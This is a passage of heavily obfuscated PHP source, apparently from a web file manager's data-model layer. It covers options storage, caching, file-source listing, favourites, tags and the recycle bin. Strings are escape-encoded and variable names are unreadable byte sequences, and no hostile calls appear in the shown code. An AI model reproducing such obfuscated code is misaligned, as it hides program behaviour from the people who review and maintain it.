$«áá ÓÓ[51] . $ğàİ¶í¹[0] . $«áá ÓÓ[53]; } } return $òæÆŞµ; } } goto E—ŒÍ¥¦¦Ñ; fÎ„…Æ‹ë“: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\145\x6d\117\160\x74\151\x6f\x6e"; public $field = array(); public function listData($¯À³¬å = false, $İ”ÏÑ´ = "\155\x6f\144\151\x66\171\124\151\155\145", $§´ŞÆù• = false) { $¹ñ‡õáÄ = Model($this->modelType)->get(!1, $this->optionType, !0); $“¶‰èÙ” = array_values($¹ñ‡õáÄ); if ($“¶‰èÙ” && $“¶‰èÙ”[0] && !is_array($“¶‰èÙ”[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¹ñ‡õáÄ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¹ñ‡õáÄ) { return $¯À³¬å ? null : array(); } if (!$¯À³¬å) { $¹ñ‡õáÄ = array_filter(array_values($¹ñ‡õáÄ)); return array_sort_by($¹ñ‡õáÄ, $İ”ÏÑ´, $§´ŞÆù•); } return $¹ñ‡õáÄ[$_SERVER[†ûãı«°][474] . $¯À³¬å]; } public function insert($×’õ©íÙ) { $ºŠÃùşÎ =& $_SERVER[†ûãı«°]; $×’õ©íÙ = array_field_key($×’õ©íÙ, $this->field); $½ş¥†¶ô = Model($this->modelType)->get($ºŠÃùşÎ[475], $this->optionType . $ºŠÃùşÎ[476]); $½ş¥†¶ô = $½ş¥†¶ô ? $½ş¥†¶ô : 0; $×’õ©íÙ[$ºŠÃùşÎ[477]] = ++$½ş¥†¶ô; $×’õ©íÙ[$ºŠÃùşÎ[233]] = time(); $×’õ©íÙ[$ºŠÃùşÎ[88]] = time(); Model($this->modelType)->set($ºŠÃùşÎ[475], $½ş¥†¶ô, $this->optionType . $ºŠÃùşÎ[476]); Model($this->modelType)->set($ºŠÃùşÎ[474] . $½ş¥†¶ô, $×’õ©íÙ, $this->optionType); return $½ş¥†¶ô; } public function update($õŒØúŠ, $Æûøò‰¡) { $×­ ½” =& $_SERVER[†ûãı«°]; $Æûøò‰¡ = array_field_key($Æûøò‰¡, $this->field); $î°±ÙÈÕ = $this->listData($õŒØúŠ); if (!$î°±ÙÈÕ || !$õŒØúŠ) { return !1; } $Æûøò‰¡ = array_merge($î°±ÙÈÕ, $Æûøò‰¡); $Æûøò‰¡[$×­ ½”[88]] = time(); return Model($this->modelType)->set($×­ ½”[474] . $õŒØúŠ, $Æûøò‰¡, $this->optionType); } public function remove($ÖÕ±ƒÛÎ) { if (!$ÖÕ±ƒÛÎ) { return !1; } return Model($this->modelType)->remove($_SERVER[†ûãı«°][474] . $ÖÕ±ƒÛÎ, $this->optionType); } public function clear() { $Åêêïšç =& $_SERVER[†ûãı«°]; Model($this->modelType)->remove($Åêêïšç[475], $this->optionType . $Åêêïšç[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ì–âÅå¢, $ÙÏêÜ­µ) { if (!$ÙÏêÜ­µ) { return !1; } $ÎŠ¬²Ë = $this->listData(); $ÎŠ¬²Ë = array_to_keyvalue($ÎŠ¬²Ë, $ì–âÅå¢); return isset($ÎŠ¬²Ë[$ÙÏêÜ­µ]) ? $ÎŠ¬²Ë[$ÙÏêÜ­µ] : !1; } public function findByName($ˆçøùğ÷) { return $this->findByKey($_SERVER[†ûãı«°][32], $ˆçøùğ÷); } protected function resetData($ Ø…Ó¡) { $Ôö­‘Œˆ =& $_SERVER[†ûãı«°]; $ Ø…Ó¡ = is_array($ Ø…Ó¡) ? $ Ø…Ó¡ : array(); $ûÒå«¨Å = array(); for ($–¸ì¯™ñ = 0; $–¸ì¯™ñ < count($ Ø…Ó¡); $–¸ì¯™ñ++) { $ûÒå«¨Å[$Ôö­‘Œˆ[474] . $ Ø…Ó¡[$–¸ì¯™ñ][$Ôö­‘Œˆ[477]]] = $ Ø…Ó¡[$–¸ì¯™ñ]; } return Model($this->modelType)->set($ûÒå«¨Å, !1, $this->optionType); } private function getAutoName($½ş‡ş¬) { $¾Ó”ï©¸ = array_to_keyvalue($this->listData(), $_SERVER[†ûãı«°][32]); if (!$¾Ó”ï©¸ || !isset($¾Ó”ï©¸[$½ş‡ş¬])) { return $½ş‡ş¬; } for ($áè¬¬ñ  = 1; $áè¬¬ñ  < count($¾Ó”ï©¸); $áè¬¬ñ ++) { $Éİë»Œş = $½ş‡ş¬ . "\50{$áè¬¬ñ }\51"; if (!isset($¾Ó”ï©¸[$Éİë»Œş])) { return $Éİë»Œş; } } return $Éİë»Œş; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($®Œ¦Æò¬ = false, $î™¿ä†ï = '', $û¤˜íĞÏ = false) { $Å‰š =& $_SERVER[†ûãı«°]; $îĞ’Â = $this->cacheGet($î™¿ä†ï); $ğ½î®ñ÷ = $this->optionDefault($î™¿ä†ï); $ğ½î®ñ÷ = is_array($ğ½î®ñ÷) ? $ğ½î®ñ÷ : array(); if (is_array($îĞ’Â)) { $îĞ’Â = array_merge($ğ½î®ñ÷, $îĞ’Â); return $®Œ¦Æò¬ ? isset($îĞ’Â[$®Œ¦Æò¬]) ? $îĞ’Â[$®Œ¦Æò¬] : null : $îĞ’Â; } $±ù‘ïÂ· = $this->filterWhere(array($Å‰š[33] => $î™¿ä†ï)); $îĞ’Â = $this->where($±ù‘ïÂ·)->select(); $îĞ’Â = array_to_keyvalue($îĞ’Â, $Å‰š[97], $Å‰š[452]); foreach ($îĞ’Â as $ÉŞ³æ¥Ã => $ºóÆ××À) { if ($û¤˜íĞÏ || in_array($ÉŞ³æ¥Ã, $this->jsonField)) { $îĞ’Â[$ÉŞ³æ¥Ã] = json_decode($ºóÆ××À, !0); } } $this->cacheSet($î™¿ä†ï, $îĞ’Â); $îĞ’Â = array_merge($ğ½î®ñ÷, $îĞ’Â); return $®Œ¦Æò¬ ? $îĞ’Â[$®Œ¦Æò¬] : $îĞ’Â; } public function set($Éëõèª, $Âó¦œÙí = false, $¾ÊƒÈğ² = '') { $Õ¨Áã€ =& $_SERVER[†ûãı«°]; $this->cacheRemove($¾ÊƒÈğ²); $®î€¯³… = array(); $“¸À³ìÙ = is_array($Éëõèª) ? $Éëõèª : array($Éëõèª => $Âó¦œÙí); foreach ($“¸À³ìÙ as $ƒŞ„€ôğ => $¹şƒ¶‡) { if (is_array($¹şƒ¶‡)) { $¹şƒ¶‡ = json_encode_force($¹şƒ¶‡); } $this->checkLength($¹şƒ¶‡, !1, $this->tableName . $Õ¨Áã€[4] . $Éëõèª); $¹şƒ¶‡ = self::textEncode($¹şƒ¶‡); $“¸À³ìÙ = array($Õ¨Áã€[33] => $¾ÊƒÈğ², $Õ¨Áã€[97] => $ƒŞ„€ôğ, $Õ¨Áã€[452] => $¹şƒ¶‡); $®î€¯³…[] = $this->filterWhere($“¸À³ìÙ); } if (!$®î€¯³…) { return !0; } $ø“ŞÖ = $this->cacheKey($Õ¨Áã€[478]); CacheLock::lock($ø“ŞÖ); $å¶„¯ù = $this->addAll($®î€¯³…, array(), !0); CacheLock::unlock($ø“ŞÖ); return $å¶„¯ù; } protected function optionDefault($€ôËı†é = '') { return !1; } public function setDeep($õ©¹È’, $‘‰‚ˆÑê = false, $ëôÚÁâß = '') { $óÎ“ÔÁ› = explode($_SERVER[†ûãı«°][10], $õ©¹È’); $°úÇÉæ = $this->get(); array_set_value($°úÇÉæ, $õ©¹È’, $‘‰‚ˆÑê); $this->set($óÎ“ÔÁ›[0], $°úÇÉæ[$óÎ“ÔÁ›[0]], $ëôÚÁâß); } public function remove($Á¢ü°¼, $•ˆûñË¦ = '') { $½êŞ»ğ =& $_SERVER[†ûãı«°]; $this->cacheRemove($•ˆûñË¦); $«Ÿ•´°Ó = $this->filterWhere(array($½êŞ»ğ[97] => $Á¢ü°¼, $½êŞ»ğ[33] => $•ˆûñË¦)); if (is_null($Á¢ü°¼)) { unset($«Ÿ•´°Ó[$½êŞ»ğ[97]]); } return $this->where($«Ÿ•´°Ó)->delete(); } public function cacheSet($Î‡©µó™, $íİ• = false) { return Cache::set($this->cacheKey($Î‡©µó™), $íİ•); } public function cacheGet($¼¡ó°ŞÀ) { return Cache::get($this->cacheKey($¼¡ó°ŞÀ)); } public function cacheRemove($êŸáÆÉ) { return Cache::remove($this->cacheKey($êŸáÆÉ)); } protected function filterWhere($£ø‰ÙªÒ) { return $£ø‰ÙªÒ; } protected function cacheKey($úİÕ§ï) { return $úİÕ§ï; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\162\x63\145"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\155\x65" => "\151\x6f\x5f\163\157\x75\162\143\145\137\155\145\x74\x61", "\x6d\145\x74\x61\x46\151\145\x6c\144" => "\163\157\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\155\157\x64\x69\146\x79\x54\151\155\x65", "\164\x69\155\x65", "\x69\156\x73\145\162\x74", "\x66\165\156\x63\x74\x69\x6f\156"), array("\143\162\145\141\164\x65\x54\151\155\145", "\164\x69\155\x65", "\x69\x6e\163\x65\162\x74", "\x66\x75\156\143\164\x69\x6f\x6e"), array("\x76\x69\145\x77\x54\x69\155\145", "\164\x69\155\x65", "\151\156\x73\145\x72\164", "\146\x75\156\143\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ ­ó„Àâ) { return $this->listSource(array($_SERVER[†ûãı«°][479] => $ ­ó„Àâ)); } public function typeName($á¹û•î™) { static $²Åáß¢¦ = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\165\x70"); return $²Åáß¢¦[$á¹û•î™ . $_SERVER[†ûãı«°][12]]; } public function sourceListInfo($Ë¥ÖßÖ·, $ˆ£ìà€Î = false) { $õÆÌ¹›Ä =& $_SERVER[†ûãı«°]; $Ë¥ÖßÖ· = $Ë¥ÖßÖ· ? $Ë¥ÖßÖ· : array(); $Ë¥ÖßÖ· = array_filter(array_unique($Ë¥ÖßÖ·)); if (!$Ë¥ÖßÖ·) { return array(); } $ÓÌœ÷Ü = $this->where(array($õÆÌ¹›Ä[193] => array($õÆÌ¹›Ä[7], $Ë¥ÖßÖ·)))->select(); $this->_listDataApply($ÓÌœ÷Ü, $ˆ£ìà€Î); return array_to_keyvalue($ÓÌœ÷Ü, $õÆÌ¹›Ä[193]); } public function pathInfoFilter(&$»ÀÑ»ÚÛ) { $ßà²¯¼Ä =& $_SERVER[†ûãı«°]; static $ñšŞ«·Ø = false; static $©ßËğá¬ = false; static $îŞùëû› = false; if (!$ñšŞ«·Ø) { $ñõØ¿‚¦ = $ßà²¯¼Ä[480]; $ñõØ¿‚¦ .= $ßà²¯¼Ä[481]; $ñõØ¿‚¦ .= $ßà²¯¼Ä[482]; $¹éˆÂî = $ßà²¯¼Ä[483]; $ï²ûìÌ¨ = explode($ßà²¯¼Ä[50], $¹éˆÂî); $ñšŞ«·Ø = explode($ßà²¯¼Ä[50], $ñõØ¿‚¦); $©ßËğá¬ = array(); foreach ($ñšŞ«·Ø as $óœ™Ë‹) { if (in_array($óœ™Ë‹, $ï²ûìÌ¨)) { continue; } $©ßËğá¬[] = $óœ™Ë‹; } $îŞùëû› = explode($ßà²¯¼Ä[50], $ßà²¯¼Ä[484]); } foreach ($îŞùëû› as $ë×¹‡‡) { if (isset($»ÀÑ»ÚÛ[$ë×¹‡‡])) { $»ÀÑ»ÚÛ[$ë×¹‡‡] = intval($»ÀÑ»ÚÛ[$ë×¹‡‡]); } } $»ÀÑ»ÚÛ[$ßà²¯¼Ä[87]] = $ßà²¯¼Ä[485] . $»ÀÑ»ÚÛ[$ßà²¯¼Ä[193]] . $ßà²¯¼Ä[486]; $»ÀÑ»ÚÛ[$ßà²¯¼Ä[33]] = $»ÀÑ»ÚÛ[$ßà²¯¼Ä[487]] == 1 ? $ßà²¯¼Ä[78] : $ßà²¯¼Ä[232]; $»ÀÑ»ÚÛ[$ßà²¯¼Ä[190]] = $this->typeName($»ÀÑ»ÚÛ[$ßà²¯¼Ä[190]]); if ($»ÀÑ»ÚÛ[$ßà²¯¼Ä[487]] != 1) { $»ÀÑ»ÚÛ[$ßà²¯¼Ä[169]] = $»ÀÑ»ÚÛ[$ßà²¯¼Ä[488]]; unset($»ÀÑ»ÚÛ[$ßà²¯¼Ä[488]]); } $‡Ä¸¯÷ƒ = $ñšŞ«·Ø; if (isset($»ÀÑ»ÚÛ[$ßà²¯¼Ä[489]]) && $»ÀÑ»ÚÛ[$ßà²¯¼Ä[489]][$ßà²¯¼Ä[490]] == -1) { $‡Ä¸¯÷ƒ = $©ßËğá¬; } $»ÀÑ»ÚÛ = array_field_key($»ÀÑ»ÚÛ, $‡Ä¸¯÷ƒ); return $»ÀÑ»ÚÛ; } public function listUserFav() { $¾â³¾œ¼ =& $_SERVER[†ûãı«°]; $íª‚ÕÆ = Model($¾â³¾œ¼[491])->listData(); $ôÉåÔ¯î = array_filter_by_field($íª‚ÕÆ, $¾â³¾œ¼[33], $¾â³¾œ¼[492]); $ôÉåÔ¯î = array_to_keyvalue($ôÉåÔ¯î, $¾â³¾œ¼[12], $¾â³¾œ¼[87]); if ($ôÉåÔ¯î) { $œÉÒÚ‰ = $this->listSource(array($¾â³¾œ¼[493] => array($¾â³¾œ¼[494], $ôÉåÔ¯î))); } $œÉÒÚ‰ = array_to_keyvalue($œÉÒÚ‰[$¾â³¾œ¼[447]], $¾â³¾œ¼[193]); foreach ($íª‚ÕÆ as &$¨áÃá€‚) { $¨áÃá€‚ = array($¾â³¾œ¼[495] => $¨áÃá€‚[$¾â³¾œ¼[477]], $¾â³¾œ¼[496] => $¨áÃá€‚[$¾â³¾œ¼[32]], $¾â³¾œ¼[497] => $¨áÃá€‚[$¾â³¾œ¼[87]], $¾â³¾œ¼[498] => $¨áÃá€‚[$¾â³¾œ¼[33]], $¾â³¾œ¼[499] => $¨áÃá€‚[$¾â³¾œ¼[233]], $¾â³¾œ¼[500] => $¨áÃá€‚[$¾â³¾œ¼[88]]); if ($¨áÃá€‚[$¾â³¾œ¼[33]] == $¾â³¾œ¼[492] && $œÉÒÚ‰[$¨áÃá€‚[$¾â³¾œ¼[87]]]) { $¨áÃá€‚[$¾â³¾œ¼[90]] = $œÉÒÚ‰[$¨áÃá€‚[$¾â³¾œ¼[87]]]; } } unset($¨áÃá€‚); return $íª‚ÕÆ; } public function listUserTag($“Æ³é˜) { $¥ß•Ç¢ =& $_SERVER[†ûãı«°]; if ($“Æ³é˜ && !is_array($“Æ³é˜)) { $“Æ³é˜ = array($“Æ³é˜); } $º°Ë½®Æ = Model($¥ß•Ç¢[501])->listData(); $“µõ´ ³ = array(); $®æ©â ” = array(); foreach ($º°Ë½®Æ as $½¤ĞÔáë) { $¬ëœÆ®Õ = $½¤ĞÔáë[$¥ß•Ç¢[87]]; if (!$¬ëœÆ®Õ) { continue; } if (!isset($®æ©â ”[$¬ëœÆ®Õ])) { $®æ©â ”[$¬ëœÆ®Õ] = array(); } $®æ©â ”[$¬ëœÆ®Õ][] = $½¤ĞÔáë[$¥ß•Ç¢[502]]; $“µõ´ ³[$½¤ĞÔáë[$¥ß•Ç¢[87]]] = $½¤ĞÔáë; } $õ¸ß•‡ = array(); $ßî¦Ê…ı = array(); $ íƒ“ÂÆ = array(); foreach ($®æ©â ” as $ŸÑ÷ßÄÁ => $Û¾¿ùÚ¿) { $«À“·½ˆ = !0; if (!$“Æ³é˜) { $õ¸ß•‡[] = $ŸÑ÷ßÄÁ; continue; } foreach ($“Æ³é˜ as $Õè òœë) { if (!in_array($Õè òœë, $Û¾¿ùÚ¿)) { $«À“·½ˆ = !1; break; } } if (!$«À“·½ˆ) { continue; } if (!is_numeric($ŸÑ÷ßÄÁ)) { $œ¬›ëÏ = $“µõ´ ³[$ŸÑ÷ßÄÁ]; $Ööª®Óò = array($¥ß•Ç¢[32] => $œ¬›ëÏ[$¥ß•Ç¢[32]], $¥ß•Ç¢[87] => $œ¬›ëÏ[$¥ß•Ç¢[87]], $¥ß•Ç¢[33] => $œ¬›ëÏ[$¥ß•Ç¢[33]], $¥ß•Ç¢[90] => array($¥ß•Ç¢[503] => 1), $¥ß•Ç¢[234] => !0); if ($œ¬›ëÏ[$¥ß•Ç¢[33]] == $¥ß•Ç¢[232]) { $ íƒ“ÂÆ[] = $Ööª®Óò; } if ($œ¬›ëÏ[$¥ß•Ç¢[33]] == $¥ß•Ç¢[78]) { $ßî¦Ê…ı[] = $Ööª®Óò; } continue; } $õ¸ß•‡[] = $ŸÑ÷ßÄÁ; } if ($õ¸ß•‡) { $í‘¾†ÖÑ = $this->listSource(array($¥ß•Ç¢[493] => array($¥ß•Ç¢[494], $õ¸ß•‡))); } $í‘¾†ÖÑ = $í‘¾†ÖÑ ? $í‘¾†ÖÑ : array($¥ß•Ç¢[85] => array(), $¥ß•Ç¢[86] => array()); $í‘¾†ÖÑ[$¥ß•Ç¢[85]] = array_merge($í‘¾†ÖÑ[$¥ß•Ç¢[85]], $ßî¦Ê…ı); $í‘¾†ÖÑ[$¥ß•Ç¢[86]] = array_merge($í‘¾†ÖÑ[$¥ß•Ç¢[86]], $ íƒ“ÂÆ); if (isset($í‘¾†ÖÑ[$¥ß•Ç¢[444]]) && count($õ¸ß•‡) == $í‘¾†ÖÑ[$¥ß•Ç¢[444]][$¥ß•Ç¢[445]]) { return $í‘¾†ÖÑ; } $ˆˆ‡¼Ñ¢ = array(); $Ãê¼ÒµÎ = array_to_keyvalue($í‘¾†ÖÑ[$¥ß•Ç¢[85]], $¥ß•Ç¢[12], $¥ß•Ç¢[193]); $¿ «¦íÍ = array_to_keyvalue($í‘¾†ÖÑ[$¥ß•Ç¢[86]], $¥ß•Ç¢[12], $¥ß•Ç¢[193]); $ù²âé = array_merge($¿ «¦íÍ, $Ãê¼ÒµÎ); foreach ($õ¸ß•‡ as $¬ëœÆ®Õ) { if (!in_array($¬ëœÆ®Õ, $ù²âé)) { $ˆˆ‡¼Ñ¢[] = $¬ëœÆ®Õ; } } if ($ˆˆ‡¼Ñ¢) { Model($¥ß•Ç¢[504])->removeBySource($ˆˆ‡¼Ñ¢); } return $í‘¾†ÖÑ; } public function listUserRecycle() { $ê†ô»Ö =& $_SERVER[†ûãı«°]; $¶”üÊ¾ = Model($ê†ô»Ö[505])->listData(); if (!$¶”üÊ¾) { return array(); } $ƒ²ĞÓ“ = array($ê†ô»Ö[493] => array($ê†ô»Ö[494], $¶”üÊ¾), $ê†ô»Ö[506] => 1); return $this->listSource($ƒ²ĞÓ“); } public function listSource($Ã¹‹â£, $ÃÜ’¤œ = 3000, $É¦«â¿œ = false) { $éç·Ú =& $_SERVER[†ûãı«°]; if (!isset($Ã¹‹â£[$éç·Ú[507]])) { $Ã¹‹â£[$éç·Ú[507]] = 0; } if (isset($Ã¹‹â£[$éç·Ú[192]]) && $Ã¹‹â£[$éç·Ú[192]] == $éç·Ú[230]) { $Ã¹‹â£[$éç·Ú[488]] = array($éç·Ú[508], $éç·Ú[12]); } $ÅäÕŠó” = $éç·Ú[509]; $Ÿ¬ëôŸœ = $this->field($ÅäÕŠó”)->_makeOrder()->where($Ã¹‹â£)->selectPage($ÃÜ’¤œ); $this->_listPageCheck($Ÿ¬ëôŸœ, $ÅäÕŠó”, $Ã¹‹â£); $this->_listDataApply($Ÿ¬ëôŸœ[$éç·Ú[447]], $É¦«â¿œ); $this->_listMake($Ÿ¬ëôŸœ); return $Ÿ¬ëôŸœ; } private function _listPageCheck(&$ÑÃêÃ¡ß, $ˆ†ÏÆ–ğ, $Ïõ¹—) { $‰É–Œ’ñ =& $_SERVER[†ûãı«°]; if (!is_array($ÑÃêÃ¡ß[$‰É–Œ’ñ[444]])) { return; } $Ä³–üŠÖ = $ÑÃêÃ¡ß[$‰É–Œ’ñ[444]]; if ($Ä³–üŠÖ[$‰É–Œ’ñ[446]] <= 1) { return; } if ($Ä³–üŠÖ[$‰É–Œ’ñ[445]] >= 100000) { return; } if (Model($‰É–Œ’ñ[510])->get($‰É–Œ’ñ[511]) != $‰É–Œ’ñ[512]) { return; } $ˆ†ÏÆ–ğ = str_replace(array($‰É–Œ’ñ[53], $‰É–Œ’ñ[419], $‰É–Œ’ñ[287]), $‰É–Œ’ñ[12], $ˆ†ÏÆ–ğ); $ˆ†ÏÆ–ğ = $‰É–Œ’ñ[513] . str_replace($‰É–Œ’ñ[50], $‰É–Œ’ñ[514], $ˆ†ÏÆ–ğ) . $‰É–Œ’ñ[515]; $Éšå¸äÉ = $‰É–Œ’ñ[516]; $Éšå¸äÉ = $Éšå¸äÉ . $‰É–Œ’ñ[517]; $ş˜Í°é÷ = $Ä³–üŠÖ[$‰É–Œ’ñ[441]] * ($Ä³–üŠÖ[$‰É–Œ’ñ[430]] - 1) . $‰É–Œ’ñ[50] . $Ä³–üŠÖ[$‰É–Œ’ñ[441]]; $ûÁò²¼Ú = $this->_makeOrder(!0); $èÙ’ó‡À = $‰É–Œ’ñ[513] . str_replace($‰É–Œ’ñ[50], $‰É–Œ’ñ[514], $ûÁò²¼Ú[0]); if (strpos($èÙ’ó‡À, $‰É–Œ’ñ[518])) { $èÙ’ó‡À = str_replace($‰É–Œ’ñ[518], $‰É–Œ’ñ[519], $èÙ’ó‡À); } else { $èÙ’ó‡À .= $‰É–Œ’ñ[520] . $ûÁò²¼Ú[1]; } $à¿Üè©¦ = array(); foreach ($Ïõ¹— as $¥¦Ú¾À„ => $Ş·éô–í) { $à¿Üè©¦[$‰É–Œ’ñ[513] . $¥¦Ú¾À„] = $Ş·éô–í; } $this->alias($‰É–Œ’ñ[521])->field($ˆ†ÏÆ–ğ)->limit($ş˜Í°é÷)->order($èÙ’ó‡À); $âø»¯ïô = $this->join($Éšå¸äÉ)->where($à¿Üè©¦)->select(); if ($âø»¯ïô) { $ÑÃêÃ¡ß[$‰É–Œ’ñ[447]] = $âø»¯ïô; } } protected function _makeOrder($•Ö†ş—Å = false) { $ÕĞÖ•İÂ =& $_SERVER[†ûãı«°]; $¶õª¸ÌÉ = Model($ÕĞÖ•İÂ[522])->get($ÕĞÖ•İÂ[523]); $Ï¾Ü¢“Œ = Model($ÕĞÖ•İÂ[522])->get($ÕĞÖ•İÂ[524]); $‹ì• ù¡ = array($ÕĞÖ•İÂ[525] => $ÕĞÖ•İÂ[526], $ÕĞÖ•İÂ[527] => $ÕĞÖ•İÂ[528]); $Æ—­Ñƒ¼ = array($ÕĞÖ•İÂ[32] => $ÕĞÖ•İÂ[32], $ÕĞÖ•İÂ[79] => $ÕĞÖ•İÂ[79], $ÕĞÖ•İÂ[169] => $ÕĞÖ•İÂ[488], $ÕĞÖ•İÂ[529] => $ÕĞÖ•İÂ[529], $ÕĞÖ•İÂ[530] => $ÕĞÖ•İÂ[531], $ÕĞÖ•İÂ[233] => $ÕĞÖ•İÂ[233], $ÕĞÖ•İÂ[88] => $ÕĞÖ•İÂ[88]); $¯–Ü¦²´ = Input::get($ÕĞÖ•İÂ[532], $ÕĞÖ•İÂ[7], $¶õª¸ÌÉ, array_keys($Æ—­Ñƒ¼)); $ÉÔ§Ğ = Input::get($ÕĞÖ•İÂ[533], $ÕĞÖ•İÂ[7], $Ï¾Ü¢“Œ, array_keys($‹ì• ù¡)); if (!in_array($¯–Ü¦²´, array_keys($Æ—­Ñƒ¼))) { $¯–Ü¦²´ = $ÕĞÖ•İÂ[32]; } if (!in_array($ÉÔ§Ğ, array_keys($‹ì• ù¡))) { $¯–Ü¦²´ = $ÕĞÖ•İÂ[525]; } if ($¯–Ü¦²´ == $ÕĞÖ•İÂ[32]) { } $‚å’ª = $ÕĞÖ•İÂ[534] . $Æ—­Ñƒ¼[$¯–Ü¦²´] . $ÕĞÖ•İÂ[53] . $‹ì• ù¡[$ÉÔ§Ğ]; $‚å’ª = rtrim(trim($‚å’ª), $ÕĞÖ•İÂ[50]); if ($•Ö†ş—Å) { return array($‚å’ª, $‹ì• ù¡[$ÉÔ§Ğ]); } return $this->order($‚å’ª); } protected function _listDataApplyItem($—ù±“É‡, $•È¨èï = false) { $µÓ‡»ù‘ = array($—ù±“É‡); $this->_listDataApply($µÓ‡»ù‘, $•È¨èï); return $µÓ‡»ù‘[0]; } protected function _listDataApply(&$‰Ü»ñ¼‚, $ƒ¬¨ÂĞº = false) { $µ–ÔÅ¸Ò =& $_SERVER[†ûãı«°]; if (!$‰Ü»ñ¼‚) { $‰Ü»ñ¼‚ = array(); return; } $„ÈŒ¸¦… = array_to_keyvalue($‰Ü»ñ¼‚, $µ–ÔÅ¸Ò[12], $µ–ÔÅ¸Ò[193]); $„ÈŒ¸¦… = array_unique($„ÈŒ¸¦…); $this->_listSourceCache($‰Ü»ñ¼‚); if (!$ƒ¬¨ÂĞº) { $this->_listAppendMeta($‰Ü»ñ¼‚, $„ÈŒ¸¦…); $this->_listAppendFileMeta($‰Ü»ñ¼‚, $„ÈŒ¸¦…); $this->_listAppendChildren($‰Ü»ñ¼‚, $„ÈŒ¸¦…); } $this->_listAppendPath($‰Ü»ñ¼‚); $this->_listAppendAuth($‰Ü»ñ¼‚); $this->_listAppendSourceInfo($‰Ü»ñ¼‚, $„ÈŒ¸¦…); $this->_listAppendUser($‰Ü»ñ¼‚); $this->_listFilterInfo($‰Ü»ñ¼‚, $ƒ¬¨ÂĞº); $this->_listAppendAuthSecret($‰Ü»ñ¼‚); } protected function _listSourceCache($‡–÷ìÇô) { $É™Ï¸¡ß =& $_SERVER[†ûãı«°]; foreach ($‡–÷ìÇô as $À’Ûëê°) { self::$cacheSourceInfo[$É™Ï¸¡ß[535] . $À’Ûëê°[$É™Ï¸¡ß[193]]] = $À’Ûëê°; } } protected function _listFilterInfo(&$ÃºŒˆ±Ÿ, $¾—²ã‚õ = false) { $¤Ò‘·á› =& $_SERVER[†ûãı«°]; foreach ($ÃºŒˆ±Ÿ as &$ŒÏ´øæ) { $ŒÏ´øæ = $this->pathInfoFilter($ŒÏ´øæ); self::$cachePathInfo[$¤Ò‘·á›[536] . intval($¾—²ã‚õ) . $¤Ò‘·á›[464] . $ŒÏ´øæ[$¤Ò‘·á›[193]]] = $ŒÏ´øæ; } unset($ŒÏ´øæ); } protected function _listMake(&$ü•¹«¿Ú) { $ÔÉ¶Î¼ =& $_SERVER[†ûãı«°]; $ü•¹«¿Ú[$ÔÉ¶Î¼[85]] = array(); $ü•¹«¿Ú[$ÔÉ¶Î¼[86]] = array(); foreach ($ü•¹«¿Ú[$ÔÉ¶Î¼[447]] as $°°ğãìÔ) { $²õ”‚†Ó = $°°ğãìÔ[$ÔÉ¶Î¼[487]] == 1 ? $ÔÉ¶Î¼[85] : $ÔÉ¶Î¼[86]; $ü•¹«¿Ú[$²õ”‚†Ó][] = $°°ğãìÔ; } unset($ü•¹«¿Ú[$ÔÉ¶Î¼[447]]); } protected function _listAppendMeta(&$úµ‘›¨, $²‰ô¤ò) { $ã»îÈ¸Œ =& $_SERVER[†ûãı«°]; $â’ØØÏ = array($ã»îÈ¸Œ[493] => array($ã»îÈ¸Œ[494], $²‰ô¤ò)); $×üƒÇØü = Model($ã»îÈ¸Œ[537])->field($ã»îÈ¸Œ[538])->where($â’ØØÏ)->select(); if (!$×üƒÇØü) { return; } $£Í§×¡ = array($ã»îÈ¸Œ[539], $ã»îÈ¸Œ[540], $ã»îÈ¸Œ[519]); $È’—òß = array(); foreach ($×üƒÇØü as $òÔÇ ÚĞ) { if (!isset($È’—òß[$òÔÇ ÚĞ[$ã»îÈ¸Œ[193]]])) { $È’—òß[$òÔÇ ÚĞ[$ã»îÈ¸Œ[193]]] = array(); } if (in_array($òÔÇ ÚĞ[$ã»îÈ¸Œ[97]], $£Í§×¡)) { continue; } if ($òÔÇ ÚĞ[$ã»îÈ¸Œ[97]] == $ã»îÈ¸Œ[541]) { $òÔÇ ÚĞ[$ã»îÈ¸Œ[452]] = $ã»îÈ¸Œ[542]; } $È’—òß[$òÔÇ ÚĞ[$ã»îÈ¸Œ[193]]][$òÔÇ ÚĞ[$ã»îÈ¸Œ[97]]] = $òÔÇ ÚĞ[$ã»îÈ¸Œ[452]]; } foreach ($úµ‘›¨ as &$¾Ëœ™ò) { $¾Ëœ™ò[$ã»îÈ¸Œ[543]] = !1; if (isset($È’—òß[$¾Ëœ™ò[$ã»îÈ¸Œ[193]]])) { $¾Ëœ™ò[$ã»îÈ¸Œ[543]] = $È’—òß[$¾Ëœ™ò[$ã»îÈ¸Œ[193]]]; } if ($this->fileIsLock($¾Ëœ™ò) && $¾Ëœ™ò[$ã»îÈ¸Œ[489]]) { $ˆ…´—ó¾ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¾Ëœ™ò[$ã»îÈ¸Œ[489]][$ã»îÈ¸Œ[490]] = AuthModel::authDisable($¾Ëœ™ò[$ã»îÈ¸Œ[489]][$ã»îÈ¸Œ[490]], $ˆ…´—ó¾); $¾Ëœ™ò[$ã»îÈ¸Œ[489]][$ã»îÈ¸Œ[544]][$ã»îÈ¸Œ[489]] = $¾Ëœ™ò[$ã»îÈ¸Œ[489]][$ã»îÈ¸Œ[490]]; } } unset($¾Ëœ™ò); } protected function _listAppendFileMeta(&$Ş€Ï·ô, $÷·ÁÔê—) { $ŠÆ¬Ùµô =& $_SERVER[†ûãı«°]; $¸Ö³·›ö = array_to_keyvalue($Ş€Ï·ô, $ŠÆ¬Ùµô[12], $ŠÆ¬Ùµô[545]); 